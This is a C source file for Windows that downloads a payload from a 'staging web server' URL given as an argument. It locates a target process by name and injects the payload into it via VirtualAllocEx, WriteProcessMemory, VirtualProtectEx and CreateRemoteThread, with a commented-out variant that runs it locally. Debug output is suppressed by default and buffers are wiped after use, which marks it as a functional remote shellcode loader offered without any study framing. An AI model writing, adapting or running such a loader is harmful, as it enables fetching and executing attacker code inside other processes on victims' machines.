#include <Windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "Wininet.lib");

//#define LOG_DEBUG_MSG

#ifdef LOG_DEBUG_MSG
#define DEBUG_PRINT(fmt, ...) \
	printf("[DEBUG] (%s:%d) " fmt "\n", __FILE__, __LINE__,  ##__VA_ARGS__)
#else
#define	DEBUG_PRINT(fmt, ...) ((void)0)
#endif // !LOG_DEBUG_MSG

// Retrieves payload from the staging web server
BOOL FetchBlob(
	IN		LPCWSTR	lpszUrl,
	OUT		PBYTE*	ppBlob,
	OUT		PSIZE_T	psBlobSize
) {
	BOOL bSTATE = TRUE;

	HINTERNET	hInternet		= NULL;
	HINTERNET	hInternetFile	= NULL;

	PBYTE		pBuffer			= NULL;
	SIZE_T		sBufferSize		= 0;

	DWORD		dwBytesRead = 0;

	BYTE		pTmpBuffer[4096];

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		DEBUG_PRINT("InternetOpenW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	hInternetFile = InternetOpenUrlW(
		hInternet,
		lpszUrl,
		NULL,
		NULL,
		INTERNET_FLAG_HYPERLINK,
		NULL
	);

	if (hInternetFile == NULL) {
		DEBUG_PRINT("InternetOpenUrlW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpBuffer, sizeof(pTmpBuffer), &dwBytesRead)) {
			DEBUG_PRINT("InternetReadFile failed with error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		if (!(dwBytesRead > 0)) {
			break;
		}

		if (pBuffer == NULL)
			pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
		else
			pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, sBufferSize + dwBytesRead);

		if (pBuffer == NULL) {
			DEBUG_PRINT("Failed to (re)allocate pBuffer. Last error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		memcpy(pBuffer + sBufferSize, pTmpBuffer, dwBytesRead);

		sBufferSize += dwBytesRead;
	}

	*ppBlob		= pBuffer;
	*psBlobSize	= sBufferSize;

_CleanUp:
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet) {
		InternetCloseHandle(hInternet);
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	}
	RtlSecureZeroMemory(pTmpBuffer, 4096);

	return bSTATE;
}

//void PrintHexData(PBYTE pByteArray, SIZE_T sSize) {
//	for (int i = 0; i < sSize; i++) {
//		printf("%0.2X ", pByteArray[i]);
//		if (i % 16 == 15)
//			putchar('\n');
//	}
//	putchar('\n');
//}

BOOL GetRemoteProcessHandle(
	IN	LPWSTR	lpszProcessName,
	OUT	PHANDLE phProcess
) {
	BOOL	bSTATE		= TRUE;

	HANDLE hSnapshot	= NULL;

	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		DEBUG_PRINT("CreateToolhelp32Snapshot failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	if (!Process32First(hSnapshot, &Proc)) {
		DEBUG_PRINT("Process32First failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	do {
		if (Proc.szExeFile) {
			if (_wcsicmp(Proc.szExeFile, lpszProcessName) == 0) {
				wprintf(L"[i] Found process \"%s\" with PID: %d\n", lpszProcessName, Proc.th32ProcessID);
				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
				if (*phProcess == NULL) {
					DEBUG_PRINT("OpenProcess failed with error: %lu\n", GetLastError());
					bSTATE = FALSE;
					goto _CleanUp;
				}

				break;
			}
		}
	} while (Process32Next(hSnapshot, &Proc));

_CleanUp:
	if (hSnapshot)
		CloseHandle(hSnapshot);

	return bSTATE;
}

//void Run(
//	IN	PBYTE	pBlob,
//	IN	SIZE_T	sBlobSize
//) {
//	BOOL	bSTATE			= TRUE;
//
//	PBYTE	pExecBlob = NULL;
//	DWORD	dwOldProtection	= 0;
//
//	HANDLE	hThread = NULL;
//
//	pExecBlob = VirtualAlloc(NULL, sBlobSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
//
//	if (pExecBlob == NULL) {
//		DEBUG_PRINT("VirtualAlloc failed with error: %lu\n", GetLastError());
//	}
//
//	memcpy(pExecBlob, pBlob, sBlobSize);
//	RtlSecureZeroMemory(pBlob, sBlobSize);
//
//	if (!VirtualProtect(pExecBlob, sBlobSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
//		DEBUG_PRINT("VirtualProtect failed with error: %lu\n", GetLastError());
//		bSTATE = FALSE;
//	}
//
//	hThread = CreateThread(NULL, NULL, pExecBlob, NULL, NULL, NULL);
//	if (hThread == NULL) {
//		DEBUG_PRINT("CreateThread failed with error: %lu\n", GetLastError());
//		bSTATE = FALSE;
//	}
//
//	WaitForSingleObject(hThread, INFINITE);
//
//	return bSTATE;
//}

void RunRemote(
	IN	HANDLE	hProcess,
	IN	PBYTE	pBlob,
	IN	SIZE_T	sBlobSize
) {
	PVOID	pExecAddress			= NULL;
	
	SIZE_T	sNumberOfBytesWritten	= NULL;

	DWORD	dwOldProtection			= NULL;

	pExecAddress = VirtualAllocEx(hProcess, NULL, sBlobSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pExecAddress == NULL) {
		DEBUG_PRINT("VirtualAllocEx failed with error: %lu\n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pExecAddress, pBlob, sBlobSize, &sNumberOfBytesWritten)) {
		DEBUG_PRINT("WriteProcessMemory failed with error: %lu\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pExecAddress, sBlobSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DEBUG_PRINT("VirtualProtectEx failed with error: %lu\n", GetLastError());
		return FALSE;
	}

	RtlSecureZeroMemory(pBlob, sBlobSize);

	if (CreateRemoteThread(hProcess, NULL, NULL, pExecAddress, NULL, NULL, NULL) == NULL) {
		DEBUG_PRINT("CreateRemoteThread failed with error: %lu\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int wmain(int argc, wchar_t** argv) {
	PBYTE	pBlob		= NULL;
	SIZE_T	sBlobSize	= 0;
	HANDLE	hProcess	= NULL;
	
	FetchBlob(argv[1], &pBlob, &sBlobSize);
	//PrintHexData(pBlob, sBlobSize);

	//Run(pBlob, sBlobSize);
	GetRemoteProcessHandle(argv[2], &hProcess);
	RunRemote(hProcess, pBlob, sBlobSize);


#ifdef LOG_DEBUG_MSG
	system("PAUSE");
#endif // !LOG_DEBUG_MSG
	return 0;
}
